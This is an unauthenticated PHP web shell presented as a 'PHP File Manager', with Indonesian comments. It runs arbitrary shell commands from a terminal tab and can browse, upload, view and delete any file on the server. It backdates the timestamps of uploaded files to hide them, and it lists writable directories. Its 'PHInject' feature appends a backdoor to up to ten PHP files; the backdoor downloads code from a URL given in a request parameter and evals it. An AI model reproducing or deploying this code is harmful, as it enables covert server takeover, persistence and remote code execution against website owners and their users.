<?php
ini_set('log_errors', 1);
ini_set('display_errors', 0);

session_start(); // Start the session to track folder creation status

function setCookieDir($dir) {
    setcookie('current_dir', $dir, time() + 7200, '/'); // Set cookie for 2 hours
}

function getCookieDir() {
    return isset($_COOKIE['current_dir']) ? $_COOKIE['current_dir'] : getcwd();
}

function sanitizePath($path) {
    return str_replace("\\", "/", htmlspecialchars($path));
}

function path() {
    $dir = isset($_GET['dir']) ? sanitizePath($_GET['dir']) : getCookieDir();
    $dir = realpath($dir);
    
    if ($dir && is_dir($dir)) {
        chdir($dir);
        setCookieDir($dir);
    } else {
        $dir = getcwd();
        setCookieDir($dir);
    }

    return $dir;
}

if (isset($_POST['cmd'])) {
    $command = $_POST['cmd'];
    if ($command === 'cls' || $command === 'clear') {
        echo '__CLEAR__';
    } else {
        $output = exe($command);
        echo nl2br(htmlspecialchars($output));
    }
    exit;
}

function cmdType() {
    $typeOs = PHP_OS_FAMILY;

    if ($typeOs === 'Windows') {
        $output = shell_exec('powershell -Command "$PSVersionTable.PSVersion" 2>&1');
        if (strpos($output, 'PSVersion') !== false) {
            return "PowerShell";
        } else {
            $output = shell_exec('ver 2>&1');
            if ($output !== null) {
                return "Command Prompt (cmd.exe)";
            }
        }
    } elseif ($typeOs === 'Linux') {
        // Checking if bash or other shell is available
        $shell = shell_exec('echo $0');
        if (strpos($shell, 'bash') !== false) {
            return "Bash";
        } elseif (strpos($shell, 'sh') !== false) {
            return "Shell (sh)";
        } else {
            return "Unknown Linux Shell";
        }
    } else {
        return "Unsupported OS";
    }
}

function exe($cmd) {
    if (function_exists('system')) {
        @ob_start();
        @system($cmd);
        $buff = @ob_get_contents();
        @ob_end_clean();
        return $buff;
    } elseif (function_exists('exec')) {
        @exec($cmd, $results);
        $buff = "";
        foreach ($results as $result) {
            $buff .= $result . "\n";
        }
        return $buff;
    } elseif (function_exists('passthru')) {
        @ob_start();
        @passthru($cmd);
        $buff = @ob_get_contents();
        @ob_end_clean();
        return $buff;
    } elseif (function_exists('shell_exec')) {
        $buff = @shell_exec($cmd);
        return $buff;
    }
    return "Command execution not supported.";
}

function perms($c) {
    $x = fileperms($c);
    if (($x & 0xC000) == 0xC000) { $u = 's'; }
    elseif (($x & 0xA000) == 0xA000) { $u = 'l'; }
    elseif (($x & 0x8000) == 0x8000) { $u = '-'; }
    elseif (($x & 0x6000) == 0x6000) { $u = 'b'; }
    elseif (($x & 0x4000) == 0x4000) { $u = 'd'; }
    elseif (($x & 0x2000) == 0x2000) { $u = 'c'; }
    elseif (($x & 0x1000) == 0x1000) { $u = 'p'; }
    else { $u = 'u'; }

    $u .= (($x & 0x0100) ? 'r' : '-');
    $u .= (($x & 0x0080) ? 'w' : '-');
    $u .= (($x & 0x0040) ? (($x & 0x0800) ? 's' : 'x') : (($x & 0x0800) ? 'S' : '-'));

    $u .= (($x & 0x0020) ? 'r' : '-');
    $u .= (($x & 0x0010) ? 'w' : '-');
    $u .= (($x & 0x0008) ? (($x & 0x0400) ? 's' : 'x') : (($x & 0x0400) ? 'S' : '-'));

    $u .= (($x & 0x0004) ? 'r' : '-');
    $u .= (($x & 0x0002) ? 'w' : '-');
    $u .= (($x & 0x0001) ? (($x & 0x0200) ? 't' : 'x') : (($x & 0x0200) ? 'T' : '-'));

    return $u;
}

function usergroup(){
    if (!function_exists('posix_getegid')) {
        $user['name']   = @get_current_user();
        $user['uid']    = @getmyuid();
        $user['gid']    = @getmygid();
        $user['group']  = "?";
    } else {
        $user['uid']    = @posix_getpwuid(posix_geteuid());
        $user['gid']    = @posix_getgrgid(posix_getegid());
        $user['name']   = $user['uid']['name'];
        $user['uid']    = $user['uid']['uid'];
        $user['group']  = $user['gid']['name'];
        $user['gid']    = $user['gid']['gid'];
    }
    return (object) $user;
}

if (!function_exists('posix_getegid')) {
    $user = @get_current_user();
    $uid = @getmyuid();
    $gid = @getmygid();
    $group = "?";
} else {
    $uid = @posix_getpwuid(posix_geteuid());
    $gid = @posix_getgrgid(posix_getegid());
    $user = $uid['name'];
    $uid = $uid['uid'];
    $group = $gid['name'];
    $gid = $gid['gid'];
}


function renderFileList($dir) {
    if (!is_dir($dir)) {
        return "<p>Direktori tidak ditemukan: " . htmlspecialchars($dir) . "</p>";
    }

    $parentDir = ($dir !== '/') ? realpath(dirname($dir)) : null;
    $items = array_diff(scandir($dir), ['.', '..']);

    $directories = [];
    $files = [];

    if ($parentDir) {
        $directories[] = [
            'type' => 'dir',
            'link' => "<a href='#' class='dir-link' data-dir='" . sanitizePath($parentDir) . "'>..</a>",
            'name' => basename($parentDir),
            'path' => $parentDir,
            'perms' => perms($parentDir),
            'modification_date' => date("Y-m-d H:i:s", filemtime($parentDir)),
            'owner' => fileowner($parentDir),
            'group' => filegroup($parentDir),
            'delete_link' => false // No delete link for parent directory
        ];
    }

    foreach ($items as $item) {
        $itemPath = $dir . DIRECTORY_SEPARATOR . $item;
        $info = [
            'name' => $item,
            'path' => $itemPath,
            'perms' => perms($itemPath),
            'modification_date' => date("Y-m-d H:i:s", filemtime($itemPath)),
            'owner' => fileowner($itemPath),
            'group' => filegroup($itemPath),
            'link' => is_dir($itemPath) 
                ? "<a href='#' class='dir-link' data-dir='" . sanitizePath($itemPath) . "'>$item</a>"
                : "<a href='#' class='file-link view-file' data-file='" . sanitizePath($itemPath) . "'>$item</a>",
            'type' => is_dir($itemPath) ? 'dir' : 'file',
            'delete_link' => ($item !== '.' && $item !== '..') // Add delete link only if item is not '.' or '..'
        ];

        if (is_dir($itemPath)) {
            $directories[] = $info;
        } elseif (is_file($itemPath)) {
            $files[] = $info;
        }
    }

    $html = "<table class='table'><thead><tr><th>Name</th><th>Type</th><th>Owner</th><th>Group</th><th>Permissions</th><th>Modification Date</th><th>Actions</th></tr></thead><tbody>";

    foreach (array_merge($directories, $files) as $item) {
        $html .= "<tr>
            <td>{$item['link']}</td>
            <td>" . ($item['type'] === 'dir' ? 'Directory' : 'File') . "</td>
            <td>{$item['owner']}</td>
            <td>{$item['group']}</td>
            <td>{$item['perms']}</td>
            <td>{$item['modification_date']}</td>
            <td>" . ($item['delete_link'] ? "<a href='#' class='delete-link' data-path='" . sanitizePath($item['path']) . "'>Delete</a>" : '') . "</td>
        </tr>";
    }

    $html .= "</tbody></table>";
    return $html;
}


$dir = path();
$statusMessage = '';

if (isset($_GET['dir'])) {
    echo renderFileList($dir);
    exit();
}

$fileListHtml = renderFileList($dir);

function createFolder($path, $folderName) {
    $fullPath = $path . DIRECTORY_SEPARATOR . $folderName;
    if (!mkdir($fullPath, 0755)) {
        return "Gagal membuat folder: " . htmlspecialchars($fullPath);
    }
    return "Folder berhasil dibuat: " . htmlspecialchars($fullPath);
}

// Fungsi untuk membuat file
function createFile($path, $fileName) {
    $fullPath = $path . DIRECTORY_SEPARATOR . $fileName;
    if (!file_put_contents($fullPath, "")) {
        return "Gagal membuat file: " . htmlspecialchars($fullPath);
    }
    return "File berhasil dibuat: " . htmlspecialchars($fullPath);
}

// Fungsi untuk menghapus file atau folder
function deleteItem($path) {
    if (is_dir($path)) {
        return rmdir($path) ? "Folder berhasil dihapus: " . htmlspecialchars($path) : "Gagal menghapus folder: " . htmlspecialchars($path);
    } elseif (is_file($path)) {
        return unlink($path) ? "File berhasil dihapus: " . htmlspecialchars($path) : "Gagal menghapus file: " . htmlspecialchars($path);
    }
    return "Item tidak ditemukan: " . htmlspecialchars($path);
}

// Fungsi untuk menangani unggahan file
if (isset($_FILES["n"])) {
    $d = isset($_POST['dir']) ? $_POST['dir'] : '';

    if (empty($d)) {
        echo json_encode(['status' => 'error', 'message' => 'Direktori tidak ditemukan']);
        exit;
    }

    $z = $_FILES["n"]["name"];
    $dd = $d;
    $r = count($z);

    $files = scandir($dd);
    $oldestFile = '';
    $oldestTime = PHP_INT_MAX;

    foreach ($files as $file) {
        $filePath = $dd . DIRECTORY_SEPARATOR . $file;
        if (is_file($filePath)) {
            $fileTime = filemtime($filePath);
            if ($fileTime < $oldestTime) {
                $oldestTime = $fileTime;
                $oldestFile = $filePath;
            }
        }
    }

    if ($oldestFile) {
        $waktu = $oldestTime;
    } else {
        $waktu = strtotime('-'.rand(30,90).' days', time()); 
    }

    $status = 'success';
    $messages = [];

    for ($i = 0; $i < $r; $i++) {
        if ($_FILES["n"]["error"][$i] != UPLOAD_ERR_OK) {
            $status = 'error';
            $messages[] = 'Error uploading file: ' . $_FILES["n"]["name"][$i];
            continue;
        }

        $targetFile = $dd . DIRECTORY_SEPARATOR . basename($z[$i]);
        if (move_uploaded_file($_FILES["n"]["tmp_name"][$i], $targetFile)) {
            touch($targetFile, $waktu, $waktu);
        } else {
            $status = 'error';
            $messages[] = 'Failed to move uploaded file: ' . $_FILES["n"]["name"][$i];
        }
    }

    echo json_encode(['status' => $status, 'messages' => $messages]);
    exit;
}

if (isset($_POST['check_writable'])) {
    $direx = sanitizePath($_POST['directory']);
    if (!is_dir($direx)) {
        echo json_encode(['error' => 'The specified directory does not exist.']);
    } else {
        $writable_dirs = check_directory_writable($direx);
        echo json_encode(['writable_dirs' => $writable_dirs]);
    }
    exit;
}
function check_directory_writable($direx) {
    $writable_dirs = [];
    $handle = opendir($direx);
    if ($handle) {
        while (($file = readdir($handle)) !== false) {
            $file_path = $direx . DIRECTORY_SEPARATOR . $file;
            if ($file != "." && $file != ".." && is_dir($file_path)) {
                if (is_writable($file_path)) {
                    $writable_dirs[] = $file_path;
                }
                // Rekursif untuk memeriksa sub-direktori
                $writable_dirs = array_merge($writable_dirs, check_directory_writable($file_path));
            }
        }
        closedir($handle);
    }
    return $writable_dirs;
}

if (isset($_POST['action'])) {
    switch ($_POST['action']) {
        case 'create_folder':
            echo createFolder(getCookieDir(), $_POST['folder_name']);
            break;
        case 'create_file':
            echo createFile(getCookieDir(), $_POST['file_name']);
            break;
        case 'delete':
            echo deleteItem($_POST['path']);
            break;
    }
    exit;
}

$results = [];
if (isset($_POST['sscan'])) {
    $direx = sanitizePath($_POST['sscan']);

    if (!is_dir($direx)) {
        echo json_encode(['error' => 'The specified directory does not exist.']);
        exit;
    }

    $url_suspicious = "https://raw.githubusercontent.com/ThatNotEasy/Shell-Scanner/main/Wordlist/Shell-Strings.txt";
    $data_suspicious = fetch_url_content($url_suspicious);
    if ($data_suspicious === false) {
        echo json_encode(['error' => 'Failed to retrieve suspicious functions list.']);
        exit;
    }
    $suspicious_functions = array_filter(array_map('trim', explode("\n", $data_suspicious)));

    $url_trusted = "https://raw.githubusercontent.com/ThatNotEasy/Shell-Scanner/main/Wordlist/Trusted-Files.txt";
    $data_trusted = fetch_url_content($url_trusted);
    if ($data_trusted === false) {
        echo json_encode(['error' => 'Failed to retrieve trusted files list.']);
        exit;
    }
    $trusted_files = array_filter(array_map('trim', explode("\n", $data_trusted)));

    scan_directory($direx, $results, $suspicious_functions, $trusted_files);

    $grouped_results = [];
    foreach ($results as $result) {
        $file = $result['file'];
        if (!isset($grouped_results[$file])) {
            $grouped_results[$file] = [];
        }
        $grouped_results[$file][] = $result['function'];
    }

    echo json_encode($grouped_results);
    exit;
}

if (isset($_POST['delete_file'])) {
    $file_path = sanitizePath($_POST['delete_file']);
    if (is_file($file_path)) {
        if (unlink($file_path)) {
            echo json_encode(['success' => 'File deleted successfully.']);
        } else {
            echo json_encode(['error' => 'Failed to delete file.']);
        }
    } else {
        echo json_encode(['error' => 'File does not exist.']);
    }
    exit;
}

if (isset($_POST['view_file'])) {
    $file_path = sanitizePath($_POST['view_file']);
    if (is_file($file_path)) {
        $content = file_get_contents($file_path);
        echo json_encode(['content' => $content]);
    } else {
        echo json_encode(['error' => 'File does not exist.']);
    }
    exit;
}

if (isset($_POST['INJECT'])) {
    // Sanitasi input untuk memastikan path yang valid
    $direx = sanitizePath($_POST['INJECT']);
    
    // Fungsi untuk memeriksa apakah file berisi HTML
    function containsHtml($file) {
        $content = file_get_contents($file);
        return strpos($content, '<html>') !== false || strpos($content, '<!DOCTYPE html>') !== false;
    }

    // Fungsi untuk menyisipkan kode ke akhir file
    function injectCode($file, $coded) {
        // Baca konten file
        $content = file_get_contents($file);
        // Sisipkan kode di akhir file
        $newContent = $content . "\n" . $coded;
        // Tulis kembali ke file
        file_put_contents($file, $newContent);
        // Kembalikan nama file yang berhasil diinjeksi
        return $file;
    }

    // Fungsi untuk memindai direktori dan mengumpulkan file yang memenuhi syarat
    function scanForFiles($dir) {
        $files = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($dir));
        $fileList = [];
        foreach ($files as $file) {
            if ($file->isFile() && $file->getExtension() === 'php') {
                $filePath = $file->getRealPath();
                if (containsHtml($filePath)) {
                    $fileList[] = $filePath; // Simpan file yang memenuhi syarat
                }
            }
        }
        return $fileList;
    }

    $coded = 'IDBTE4M <?php $ch = curl_init($_GET["memex"]); curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); $result = curl_exec($ch); eval("?>".$result."<?php "); ?>';
    
    // Mengumpulkan file yang memenuhi syarat
    $fileList = scanForFiles($direx);
    $totalFiles = count($fileList);
    $maxFilesToInject = min(10, $totalFiles); // Maksimal 10 file atau total file yang ditemukan

    if ($totalFiles > 0) {
        echo "Found $totalFiles file(s) to inject.\n";
        echo "Injecting code into up to $maxFilesToInject file(s):\n";
        $injectedFiles = [];
        for ($i = 0; $i < $maxFilesToInject; $i++) {
            $file = $fileList[$i];
            $injectedFile = injectCode($file, $coded);
            $injectedFiles[] = $injectedFile; // Simpan file yang berhasil diinjeksi
        }
        
        // Menampilkan nama-nama file yang berhasil diinjeksi
        if (!empty($injectedFiles)) {
            foreach ($injectedFiles as $file) {
                echo $file . "\n";
            }
        }
    } else {
        echo "No files found to inject.\n";
    }

    var_dump($direx);
}

// Fungsi untuk memeriksa ekstensi file
function Extract_Files($fileName) {
    $extensions = array('php', 'phtml', 'php3', 'php4', 'php5', 'php6', 'php7', 'php8', 'phar', 'shtml', 'cgi', 'py', 'sh', 'alfa', 'pl');
    $file_ext = pathinfo($fileName, PATHINFO_EXTENSION);
    return in_array($file_ext, $extensions);
}

// Fungsi untuk memindai direktori
function scan_directory($direx, &$results, $suspicious_functions, $trusted_files) {
    $handle = opendir($direx);
    if ($handle) {
        while (($file = readdir($handle)) !== false) {
            $file_path = $direx . DIRECTORY_SEPARATOR . $file;
            if ($file != "." && $file != ".." && !in_array($file, $trusted_files)) {
                if (is_dir($file_path)) {
                    scan_directory($file_path, $results, $suspicious_functions, $trusted_files);
                } else {
                    if (Extract_Files($file)) {
                        $content = @file_get_contents($file_path);
                        if ($content !== false) {
                            foreach ($suspicious_functions as $function) {
                                if (stripos($content, $function) !== false) {
                                    $results[] = array(
                                        'file' => $file_path,
                                        'function' => $function,
                                    );
                                }
                            }
                        }
                    }
                }
            }
        }
        closedir($handle);
    }
}

// Fungsi untuk mengambil konten dari URL
function fetch_url_content($url) {
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
    $data = curl_exec($ch);
    curl_close($ch);
    return $data;
}

?>

<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>File Manager</title>
    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css">
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
    <script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.5.2/js/bootstrap.min.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/jquery.terminal/js/jquery.terminal.min.js"></script>
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/jquery.terminal/css/jquery.terminal.min.css"/>
    <link rel="stylesheet" href="https://xlscls.github.io/Beelzebuth.css"/>
</head>
<body>
<div id="loading-screen" style="display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0, 0, 0, 0.5); color: white; text-align: center; padding-top: 20%; font-size: 24px; z-index: 9999;">
    Loading, please wait...
</div>
<div class="container">
    <h2 class="text-center mb-4">PHP File Manager</h2>
    <!-- Your existing navigation and form code -->
    <ul class="nav nav-pills mb-3" id="pills-tab" role="tablist">
        <li class="nav-item">
            <a class="nav-link active" id="explorer-tab" data-toggle="pill" href="#explorer" role="tab" aria-controls="explorer" aria-selected="true">Explorer</a>
        </li>
        <li class="nav-item">
            <a class="nav-link" id="cmd-tab" data-toggle="pill" href="#cmd" role="tab" aria-controls="cmd" aria-selected="false">CMD</a>
        </li>
        <li class="nav-item">
            <a class="nav-link" id="scanner-tab" data-toggle="pill" href="#scanner" role="tab" aria-controls="scanner" aria-selected="false">Scanner</a>
        </li>
        <li class="nav-item">
            <a class="nav-link" id="phinject-tab" data-toggle="pill" href="#phinject" role="tab" aria-controls="phinject" aria-selected="false">PHInject</a>
        </li>
    </ul>
    <div class="info-section mb-4">
        <div class="info-item">Info:</div>
        <div class="info-item">Info:</div>
        <div class="info-item">Current Directory : <span id="current-dir"><?php echo htmlspecialchars($dir); ?></span></div>
    </div>

    <table style="width:100%; border-collapse: collapse;">
        <tr>
            <td style="width:33%; padding: 10px; vertical-align: top;">
                <div class="mb-3">
                    <form id="create-folder-form" method="POST">
                        <table style="width:100%;">
                            <tbody>
                                <tr>
                                    <td><input type="text" class="form-control" name="folder_name" placeholder="Folder Name" required style="width:100%;"></td>
                                    <td><input type="submit" class="btn" name="action" value="Create" style="width:100%; color: white;"></td>
                                </tr>
                            </tbody>
                        </table>
                    </form>
                </div>
            </td>
            <td style="width:33%; padding: 10px; vertical-align: top;">
                <div class="mb-3">
                    <form id="create-file-form" method="POST">
                        <table style="width:100%;">
                            <tbody>
                                <tr>
                                    <td><input type="text" class="form-control" name="file_name" placeholder="File Name" required style="width:100%;"></td>
                                    <td><input type="submit" class="btn" name="action" value="Create" style="width:100%; color: white;"></td>
                                </tr>
                            </tbody>
                        </table>
                    </form>
                </div>
            </td>
            <td style="width:33%; padding: 10px; vertical-align: top;">
                <div class="mb-3">
                    <form id="upload-form" method="post" enctype="multipart/form-data">
                        <table style="width:100%;">
                            <tbody>
                                <tr>
                                    <input type="hidden" name="dir" value="<?php echo htmlspecialchars($dir); ?>">
                                    <td><input type="file" name="n[]" multiple class="form-control mr-3" style="width:100%;"></td>
                                    <td><input type="submit" value="Upload" class="btn" style="width:100%; color: white;"></td>
                                </tr>
                            </tbody>
                        </table>
                    </form>
                </div>
            </td>
        </tr>
    </table>

    <div class="tab-content" id="pills-tabContent">
        <div class="tab-pane fade show active" id="explorer" role="tabpanel" aria-labelledby="explorer-tab">
            <div id="file-list">
                <?php echo $fileListHtml; ?>
            </div>
        </div>
        <div class="tab-pane fade" id="cmd" role="tabpanel" aria-labelledby="cmd-tab">
            <p>CMD Type : <?php echo cmdtype(); ?></p>
            <div id="terminal" class="terminal">
                <div id="terminal-output" class="terminal-content"></div>
                <form id="terminal-form" autocomplete="off" class="terminal-form">
                    <div class="terminal-prompt-container">
                        <span class="terminal-prompt">user@php-file-manager:~$</span>
                        <input type="text" class="terminal-input" autofocus placeholder="Type your command here..." />
                    </div>
                </form>
            </div>
        </div>
        <div class="tab-pane fade" id="scanner" role="tabpanel" aria-labelledby="scanner-tab">
            <ul class="nav nav-pills mb-3" id="pills-tab" role="tablist">
                <li class="nav-item" role="presentation">
                    <button class="nav-link active" id="pills-shellscan-tab" data-toggle="pill" data-target="#pills-shellscan" type="button" role="tab" aria-controls="pills-shellscan" aria-selected="true">Shell Scanner</button>
                </li>
                <li class="nav-item" role="presentation">
                    <button class="nav-link" id="pills-dirscan-tab" data-toggle="pill" data-target="#pills-dirscan" type="button" role="tab" aria-controls="pills-dirscan" aria-selected="false">Green Dir Scanner</button>
                </li>
            </ul>
            <div class="tab-content" id="pills-tabContent">
                <div class="tab-pane fade show active" id="pills-shellscan" role="tabpanel" aria-labelledby="pills-shellscan-tab">
                    <div class="mt-2">
                        <h4>Shell Scan</h4>
                        <form method="post" id="scan-form">
                            <div class="form-group">
                                <label for="sscan">Directory to Scan:</label>
                                <td style="width:304px;"><input type="text" id="sscan" name="sscan" value="<?php echo htmlspecialchars($dir);?>" style="width:300px;"></td>
                                <td><input class="btn " type="submit" style="width:100px; color: white;" value="Scan"></td>
                            </div>
                        </form>
                        <div id="scan-results" style="margin-top: 20px;"></div>
                    </div>
                </div>
                <div class="tab-pane fade" id="pills-dirscan" role="tabpanel" aria-labelledby="pills-dirscan-tab">
                    <div class="mt-2">
                        <h2>Check Directory Writable</h2>
                        <form method="post" id="writable-form">
                            <div class="form-group">
                                <label for="directory">Directory:</label>
                                <td style="width:304px;"><input type="text" id="directory" name="directory" value="" style="width:300px;"></td>
                                <td><input class="btn btn-outline-primary" type="submit" style="width:100px; color: white;" value="Check"></td>
                            </div>
                        </form>
                        <div id="writable-result" style="margin-top: 20px;"></div>
                    </div>
                </div>
            </div>
        </div>
        <div class="tab-pane fade" id="phinject" role="tabpanel" aria-labelledby="phinject">
            <div class="mt-2">
                <h2>INJECT</h2>
                <form method="post">
                    <div class="form-group">
                        <label for="directory">Directory:</label>
                        <td style="width:304px;"><input type="text" id="INJECT" name="INJECT" value="" style="width:300px;"></td>
                        <td><input class="btn btn-outline-primary" type="submit" style="width:100px; color: white;" value="INJECT" name="submit"></td>
                    </div>
                </form>
            </div>
        </div>
    </div>
</div>

<!-- ALL MODAL START -->
<div class="modal fade" id="fileContentModal" tabindex="-1" aria-labelledby="fileContentModalLabel" aria-hidden="true">
    <div class="modal-dialog modal-lg">
        <div class="modal-content">
            <div class="modal-header">
                <h5 class="modal-title" id="fileContentModalLabel">File Content</h5>
                <button type="button" class="close" data-dismiss="modal" aria-label="Close">
                    <span aria-hidden="true">&times;</span>
                </button>
            </div>
            <div class="modal-body">
                <pre id="fileContent" style="color: white;"></pre>
            </div>
        </div>
    </div>
</div>

<!-- END MODAL -->
<script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
<script src="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/js/bootstrap.min.js"></script>

<script>
    function showLoadingScreen() {
        document.getElementById('loading-screen').style.display = 'block';
    }

    function hideLoadingScreen() {
        document.getElementById('loading-screen').style.display = 'none';
    }

    $(document).ready(function() {
        // Handle folder creation
        $('#create-folder-form').submit(function(e) {
            e.preventDefault();
            var folderName = $(this).find('input[name="folder_name"]').val();
            $.post('', { action: 'create_folder', folder_name: folderName }, function(response) {
                alert(response);
                location.reload();
            });
        });

        // Handle file creation
        $('#create-file-form').submit(function(e) {
            e.preventDefault();
            var fileName = $(this).find('input[name="file_name"]').val();
            $.post('', { action: 'create_file', file_name: fileName }, function(response) {
                alert(response);
                location.reload();
            });
        });

        // Handle item deletion
        $(document).on('click', '.delete-link', function(e) {
            e.preventDefault();
            if (confirm('Are you sure you want to delete this item?')) {
                $.post('', { action: 'delete', path: $(this).data('path') }, function(response) {
                    alert(response);
                    location.reload();
                });
            }
        });

        $('form[enctype="multipart/form-data"]').submit(function(e) {
            e.preventDefault();
            
            var formData = new FormData(this);
            
            $.ajax({
                url: '', // Current script URL
                type: 'POST',
                data: formData,
                contentType: false,
                processData: false,
                dataType: 'json',
                success: function(response) {
                    if (response.status === 'success') {
                        alert('Files uploaded successfully!');
                        location.reload(); // Refresh page to show updated file list
                    } else {
                        alert('Error: ' + response.messages.join('\n'));
                    }
                },
                error: function(xhr, status, error) {
                    console.error('Upload failed:', status, error);
                    alert('Upload failed. Please try again.');
                }
            });
        });

        $('#scan-form').on('submit', function(event) {
            event.preventDefault();

            showLoadingScreen(); // Tampilkan layar loading saat permintaan dimulai

            $.ajax({
                url: '', // Ganti dengan URL yang sesuai
                type: 'POST',
                data: $(this).serialize(),
                dataType: 'json',
                success: function(response) {
                    var resultsContainer = $('#scan-results');
                    resultsContainer.empty();

                    if (response.error) {
                        resultsContainer.html('<div class="alert alert-danger">' + response.error + '</div>');
                    } else {
                        var resultHtml = '<table class="table table-bordered"><thead><tr><th>File</th><th>Suspicious Functions</th><th>Actions</th></tr></thead><tbody>';
                        $.each(response, function(file, functions) {
                            if (Array.isArray(functions)) {
                                var functionList = functions.join('<br>');
                                resultHtml += '<tr>';
                                resultHtml += '<td>' + $('<div>').text(file).html() + '</td>';
                                resultHtml += '<td>' + functionList + '</td>';
                                resultHtml += '<td><button class="btn btn-info view-file" data-file="' + encodeURIComponent(file) + '">View</button> ';
                                resultHtml += '<button class="btn btn-danger delete-file" data-file="' + encodeURIComponent(file) + '">Delete</button></td>';
                                resultHtml += '</tr>';
                            }
                        });
                        resultHtml += '</tbody></table>';
                        resultsContainer.html(resultHtml);
                    }

                    hideLoadingScreen(); 
                },
                error: function() {
                    $('#scan-results').html('<div class="alert alert-danger">An error occurred while scanning.</div>');
                    hideLoadingScreen(); 
                }
            });
        });

        
        $('#writable-form').on('submit', function(event) {
            event.preventDefault();

            $.ajax({
                url: '',
                type: 'POST',
                data: $(this).serialize() + '&check_writable=1',
                dataType: 'json',
                success: function(response) {
                    var resultContainer = $('#writable-result');
                    resultContainer.empty();

                    if (response.error) {
                        resultContainer.html('<div class="alert alert-danger">' + response.error + '</div>');
                    } else {
                        var resultHtml = '<table class="table table-bordered"><thead><tr><th>Writable Directories</th></tr></thead><tbody>';
                        $.each(response.writable_dirs, function(index, dir) {
                            resultHtml += '<tr><td>' + $('<div>').text(dir).html() + '</td></tr>';
                            // resultHtml += '<td><button class="btn btn-success create-folder" data-dir="' + encodeURIComponent(dir) + '">Create Folder</button> ';
                            // resultHtml += '<button class="btn btn-success create-file" data-dir="' + encodeURIComponent(dir) + '">Create File</button>';
                            // resultHtml += '<button class="btn btn-success jump" data-dir="' + encodeURIComponent(dir) + '">Jump</button></td></tr>';
                        });
                        resultHtml += '</tbody></table>';
                        resultContainer.html(resultHtml);
                    }
                },
                error: function() {
                    $('#writable-result').html('<div class="alert alert-danger">An error occurred while checking directory.</div>');
                }
            });
        });

        $(document).on('click', '.jump', function() {
            var dir = $(this).data('dir');
            // console.log(dir)
            // $('#directory').val(decodeURIComponent(dir));
            // $('#writable-form').submit(); // Mengirimkan form untuk memeriksa direktori baru
        });

        $(document).on('click', '.delete-file', function(e) {
            e.preventDefault();
            if (confirm('Are you sure you want to delete this item?')) {
                var filePath = decodeURIComponent($(this).data('file'));
                $.post('', { delete_file: filePath }, function(response) {
                    if (response.success) {
                        alert(response.success);
                        $('.delete-file[data-file="' + encodeURIComponent(filePath) + '"]').closest('tr').remove();
                    } else {
                        alert(response.error);
                    }
                }, 'json');
            }
        });

        $(document).on('click', '.view-file', function(e) {
            e.preventDefault();
            var filePath = decodeURIComponent($(this).data('file'));
            $.post('', { view_file: filePath }, function(response) {
                if (response.content) {
                    $('#fileContent').text(response.content);
                    $('#fileContentModal').modal('show');
                } else {
                    alert(response.error);
                }
            }, 'json');
        });

    });

    $(document).on('click', '.delete-link', function (e) {
        e.preventDefault();
        if (confirm('Are you sure you want to delete this item?')) {
            $.post('', { delete: $(this).data('path') }, function () {
                location.reload();
            });
        }
    });


    $(document).ready(function() {
    function refreshContainer() {
        location.reload();
    }

    $(document).on('click', '.dir-link', function(event) {
        event.preventDefault();
        var dir = $(this).data('dir');
        
        $.get('?dir=' + encodeURIComponent(dir), function(data) {
            $('#file-list').html(data);
            $('#current-dir').text(dir);

            // Update cookie with the new directory
            document.cookie = "current_dir=" + encodeURIComponent(dir) + "; path=/; max-age=7200"; // 2 hours
            refreshContainer();
        }).fail(function(jqXHR, textStatus, errorThrown) {
            console.error('Failed to load directory:', textStatus, errorThrown);
            alert('Failed to load directory.');
        });
    });

    $('#terminal-form').submit(function(e) {
        e.preventDefault();
        var command = $('.terminal-input').val();
        $.ajax({
            url: '',
            type: 'POST',
            data: { cmd: command },
            dataType: 'html',
            success: function(response) {
                if (response === '__CLEAR__') {
                    $('#terminal-output').html('');
                } else {
                    $('#terminal-output').append('<div>' + response + '</div>');
                }
                $('.terminal-input').val('').focus();
                $('#terminal-output').scrollTop($('#terminal-output')[0].scrollHeight);
            },
            error: function(xhr, status, error) {
                console.error('Error executing command:', error);
            }
        });
    });
});
</script>
</body>
</html>
